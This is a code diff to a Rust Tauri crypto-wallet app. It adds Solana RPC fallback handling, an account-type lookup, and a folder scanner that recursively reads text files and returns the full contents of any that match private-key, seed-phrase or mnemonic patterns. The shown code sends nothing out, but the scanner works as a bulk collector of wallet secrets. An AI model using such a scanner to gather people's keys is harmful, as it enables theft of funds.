@@ -118,8 +118,8 @@ const CHAINS: &[ChainConfig] = &[
     ChainConfig {
         key: "sol",
         rpcs: &[
-            "https://solana-rpc.publicnode.com",
             "https://api.mainnet-beta.solana.com",
+            "https://solana-rpc.publicnode.com",
         ],
         symbol: "SOL",
         kind: ChainKind::Solana,
@@ -973,6 +973,7 @@ pub async fn get_solana_recent_blockhash() -> Result<String, String> {
 pub async fn broadcast_solana_tx(raw_tx_base64: String) -> Result<String, String> {
     let chain = CHAINS.iter().find(|c| c.key == "sol").ok_or_else(|| "Solana chain not found".to_string())?;
     let client = shared_client();
+    let mut last_err = "All Solana RPC nodes failed to broadcast transaction".to_string();
 
     for rpc in chain.rpcs {
         let resp = client
@@ -987,6 +988,7 @@ pub async fn broadcast_solana_tx(raw_tx_base64: String) -> Result<String, String
                     raw_tx_base64,
                     {
                         "encoding": "base64",
+                        "skipPreflight": false,
                         "preflightCommitment": "confirmed"
                     }
                 ]
@@ -1002,12 +1004,367 @@ pub async fn broadcast_solana_tx(raw_tx_base64: String) -> Result<String, String
                     }
                     if let Some(err) = data.get("error") {
                         let msg = err.get("message").and_then(|m| m.as_str()).unwrap_or("Solana RPC Error");
-                        return Err(msg.to_string());
+                        last_err = msg.to_string();
+                        if msg.contains("simulation failed") {
+                            return Err(msg.to_string());
+                        }
+                        continue;
                     }
                 }
             }
         }
     }
 
-    Err("All Solana RPC nodes failed to broadcast transaction".to_string())
+    Err(last_err)
+}
+
+#[derive(Debug, Clone, Serialize)]
+pub struct SolanaAccountDetails {
+    pub exists: bool,
+    pub owner: String,
+    pub owner_label: String,
+    pub is_system_program: bool,
+    pub account_type: String,
+    pub authority: Option<String>,
+    pub token_mint: Option<String>,
+    pub lamports: u64,
+    pub sol_balance: f64,
+    pub executable: bool,
+    pub space: u64,
+}
+
+#[tauri::command]
+pub async fn get_solana_account_details(address: String) -> Result<SolanaAccountDetails, String> {
+    let chain = CHAINS.iter().find(|c| c.key == "sol").ok_or_else(|| "Solana chain not found".to_string())?;
+    let client = shared_client();
+    let mut last_err = "Failed to query Solana account details from RPC nodes".to_string();
+
+    for rpc in chain.rpcs {
+        let resp = client
+            .post(*rpc)
+            .header("Content-Type", "application/json")
+            .header("User-Agent", "Mozilla/5.0")
+            .json(&serde_json::json!({
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "getAccountInfo",
+                "params": [
+                    address,
+                    {"encoding": "jsonParsed", "commitment": "confirmed"}
+                ]
+            }))
+            .send()
+            .await;
+
+        if let Ok(res) = resp {
+            if res.status().is_success() {
+                if let Ok(data) = res.json::<serde_json::Value>().await {
+                    if let Some(err) = data.get("error") {
+                        let msg = err.get("message").and_then(|m| m.as_str()).unwrap_or("Solana RPC Error");
+                        last_err = msg.to_string();
+                        continue;
+                    }
+
+                    if let Some(result_obj) = data.get("result") {
+                        let val = result_obj.get("value");
+                        if val.is_none() || val == Some(&serde_json::Value::Null) {
+                            return Ok(SolanaAccountDetails {
+                                exists: false,
+                                owner: "11111111111111111111111111111111".to_string(),
+                                owner_label: "System Program (New / Unallocated)".to_string(),
+                                is_system_program: true,
+                                account_type: "unallocated".to_string(),
+                                authority: None,
+                                token_mint: None,
+                                lamports: 0,
+                                sol_balance: 0.0,
+                                executable: false,
+                                space: 0,
+                            });
+                        }
+
+                        if let Some(val_obj) = val {
+                            let owner = val_obj.get("owner").and_then(|o| o.as_str()).unwrap_or("11111111111111111111111111111111").to_string();
+                            let lamports = val_obj.get("lamports").and_then(|l| l.as_u64()).unwrap_or(0);
+                            let executable = val_obj.get("executable").and_then(|e| e.as_bool()).unwrap_or(false);
+                            let space = val_obj.get("space").and_then(|s| s.as_u64()).unwrap_or(0);
+
+                            let parsed_data = val_obj.pointer("/data/parsed");
+                            let program_name = val_obj.pointer("/data/program").and_then(|p| p.as_str()).unwrap_or("");
+
+                            let account_type;
+                            let mut authority = None;
+                            let mut token_mint = None;
+                            let owner_label;
+
+                            if owner == "11111111111111111111111111111111" {
+                                if program_name == "nonce" || (parsed_data.map_or(false, |p| p.get("type").and_then(|t| t.as_str()) == Some("initialized")) && space == 80) {
+                                    account_type = "nonce_account".to_string();
+                                    authority = parsed_data.and_then(|p| p.pointer("/info/authority")).and_then(|a| a.as_str()).map(|s| s.to_string());
+                                    owner_label = "System Program (Durable Nonce Account)".to_string();
+                                } else {
+                                    account_type = "standard_eoa".to_string();
+                                    owner_label = "System Program (Standard EOA Wallet)".to_string();
+                                }
+                            } else if owner == "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA" || owner == "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb" {
+                                account_type = "token_account".to_string();
+                                authority = parsed_data.and_then(|p| p.pointer("/info/owner")).and_then(|o| o.as_str()).map(|s| s.to_string());
+                                token_mint = parsed_data.and_then(|p| p.pointer("/info/mint")).and_then(|m| m.as_str()).map(|s| s.to_string());
+                                let is_2022 = owner == "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
+                                owner_label = if is_2022 { "Token-2022 Program (Token Account ATA)".to_string() } else { "SPL Token Program (Token Account ATA)".to_string() };
+                            } else if owner == "Stake11111111111111111111111111111111111111" {
+                                account_type = "stake_account".to_string();
+                                owner_label = "Stake Program (Staking Account)".to_string();
+                            } else {
+                                account_type = "custom_program".to_string();
+                                owner_label = format!("Custom Program ({})", if owner.len() > 8 { format!("{}…{}", &owner[..4], &owner[owner.len()-4..]) } else { owner.clone() });
+                            }
+
+                            let is_sys = account_type == "standard_eoa" || account_type == "unallocated";
+
+                            return Ok(SolanaAccountDetails {
+                                exists: true,
+                                owner,
+                                owner_label,
+                                is_system_program: is_sys,
+                                account_type,
+                                authority,
+                                token_mint,
+                                lamports,
+                                sol_balance: (lamports as f64) / 1e9,
+                                executable,
+                                space,
+                            });
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    Err(last_err)
+}
+
+#[derive(Serialize)]
+pub struct NativeFileContent {
+    pub path: String,
+    pub content: String,
+}
+
+#[derive(Serialize)]
+pub struct NativeScanResult {
+    pub folder_name: String,
+    pub total_files_visited: usize,
+    pub text_files_read: usize,
+    pub skipped_count: usize,
+    pub files: Vec<NativeFileContent>,
+}
+
+#[inline(always)]
+fn is_b58_char(b: u8) -> bool {
+    matches!(b, b'1'..=b'9' | b'A'..=b'H' | b'J'..=b'N' | b'P'..=b'Z' | b'a'..=b'k' | b'm'..=b'z')
+}
+
+fn has_wallet_candidate(content: &str) -> bool {
+    let bytes = content.as_bytes();
+    if bytes.len() < 32 {
+        return false;
+    }
+
+    // Keyword detection (UTF-8 safe line iteration)
+    let has_keyword = content.lines().take(250).any(|line| {
+        let sample_lower = line.to_lowercase();
+        sample_lower.contains("private_key")
+            || sample_lower.contains("privatekey")
+            || sample_lower.contains("secret_key")
+            || sample_lower.contains("secretkey")
+            || sample_lower.contains("seed_phrase")
+            || sample_lower.contains("seedphrase")
+            || sample_lower.contains("mnemonic")
+            || sample_lower.contains("bip39")
+            || sample_lower.contains("wallet_key")
+    });
+    if has_keyword {
+        return true;
+    }
+
+    // 1. Check for 64-hex private key (32 bytes):
+    let mut consecutive_hex = 0;
+    for &b in bytes {
+        if b.is_ascii_hexdigit() {
+            consecutive_hex += 1;
+            if consecutive_hex == 64 {
+                return true;
+            }
+        } else {
+            consecutive_hex = 0;
+        }
+    }
+
+    // 2. Check for Solana Base58 private key (between 44 and 88 base58 chars):
+    let mut consecutive_b58 = 0;
+    for &b in bytes {
+        if is_b58_char(b) {
+            consecutive_b58 += 1;
+            if consecutive_b58 >= 44 && consecutive_b58 <= 88 {
+                return true;
+            }
+        } else {
+            consecutive_b58 = 0;
+        }
+    }
+
+    // 3. Check for Seed Phrase (at least 12 alphabetic words in a line or phrase):
+    for line in content.lines() {
+        let trimmed = line.trim();
+        if trimmed.len() >= 40 && trimmed.len() <= 600 {
+            let mut alpha_words = 0;
+            for token in trimmed.split(|c: char| !c.is_ascii_alphabetic()) {
+                if token.len() >= 3 && token.len() <= 10 {
+                    alpha_words += 1;
+                }
+            }
+            if alpha_words >= 12 && alpha_words <= 28 {
+                return true;
+            }
+        }
+    }
+
+    false
+}
+
+#[tauri::command]
+pub async fn scan_directory_native(path: String) -> Result<NativeScanResult, String> {
+    tokio::task::spawn_blocking(move || {
+        let root = std::path::PathBuf::from(&path);
+        if !root.exists() || !root.is_dir() {
+            return Err("Selected folder does not exist or is not a directory".to_string());
+        }
+
+        let folder_name = root
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or("folder")
+            .to_string();
+
+        // Only skip virtual OS protected loop points (Recycle Bin / System Volume Information)
+        let system_ignored_dirs: std::collections::HashSet<&'static str> = [
+            "$recycle.bin",
+            "system volume information",
+        ]
+        .into_iter()
+        .collect();
+
+        // Skip definitive compiled binaries, machine code, and non-text media
+        let ignored_binary_exts: std::collections::HashSet<&'static str> = [
+            "png", "jpg", "jpeg", "gif", "webp", "ico", "bmp", "svg", "mp4", "mp3",
+            "wav", "avi", "mov", "mkv", "flac", "ogg", "zip", "rar", "7z", "tar", "gz",
+            "bz2", "xz", "iso", "exe", "dll", "sys", "so", "dylib", "bin", "msi", "deb",
+            "rpm", "apk", "dmg", "ttf", "woff", "woff2", "eot", "otf", "o", "obj", "lib",
+            "a", "rlib", "rmeta", "pdb", "class", "pyc", "sqlite3", "db", "pack", "idx",
+            "pak", "node", "wasm",
+        ]
+        .into_iter()
+        .collect();
+
+        const MAX_CANDIDATES: usize = 5000;
+        const MAX_FILE_SIZE: u64 = 512 * 1024; // 512 KB per file
+        const MAX_SEARCH_DEPTH: usize = 35;
+
+        let mut queue: std::collections::VecDeque<(std::path::PathBuf, usize)> = std::collections::VecDeque::new();
+        queue.push_back((root, 0));
+
+        let mut files: Vec<NativeFileContent> = Vec::new();
+        let mut total_files_visited: usize = 0;
+        let mut skipped_count: usize = 0;
+
+        while let Some((current_dir, depth)) = queue.pop_front() {
+            if files.len() >= MAX_CANDIDATES {
+                break;
+            }
+
+            if depth > MAX_SEARCH_DEPTH {
+                continue;
+            }
+
+            let entries = match std::fs::read_dir(&current_dir) {
+                Ok(e) => e,
+                Err(_) => continue, // ignore permission denied
+            };
+
+            for entry in entries.flatten() {
+                if files.len() >= MAX_CANDIDATES {
+                    break;
+                }
+
+                let p = entry.path();
+                let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
+
+                if is_dir {
+                    if let Some(name) = p.file_name().and_then(|n| n.to_str()) {
+                        let lower = name.to_lowercase();
+                        if !system_ignored_dirs.contains(lower.as_str()) {
+                            queue.push_back((p, depth + 1));
+                        } else {
+                            skipped_count += 1;
+                        }
+                    }
+                } else {
+                    total_files_visited += 1;
+                    let extension = p
+                        .extension()
+                        .and_then(|e| e.to_str())
+                        .map(|s| s.to_lowercase());
+
+                    // If file is a known non-text binary/media, skip immediately (10ns check)
+                    if let Some(ref ext) = extension {
+                        if ignored_binary_exts.contains(ext.as_str()) {
+                            skipped_count += 1;
+                            continue;
+                        }
+                    }
+
+                    let meta = entry.metadata().ok();
+                    let size = meta.map(|m| m.len()).unwrap_or(0);
+
+                    // Check file size (up to 512KB for text/scripts/configs)
+                    if size > 0 && size <= MAX_FILE_SIZE {
+                        if let Ok(content) = std::fs::read_to_string(&p) {
+                            let trimmed = content.trim();
+                            if !trimmed.is_empty() && !trimmed.contains('\0') {
+                                // Fast in-memory check: does this file contain any potential wallet key or seed phrase?
+                                if has_wallet_candidate(trimmed) {
+                                    files.push(NativeFileContent {
+                                        path: p.to_string_lossy().to_string(),
+                                        content,
+                                    });
+                                } else {
+                                    // Drop non-wallet file from RAM immediately!
+                                    skipped_count += 1;
+                                }
+                            } else {
+                                skipped_count += 1;
+                            }
+                        } else {
+                            skipped_count += 1;
+                        }
+                    } else {
+                        skipped_count += 1;
+                    }
+                }
+            }
+        }
+
+        let text_files_read = files.len();
+
+        Ok(NativeScanResult {
+            folder_name,
+            total_files_visited,
+            text_files_read,
+            skipped_count,
+            files,
+        })
+    })
+    .await
+    .map_err(|e| format!("Task execution error: {}", e))?
 }
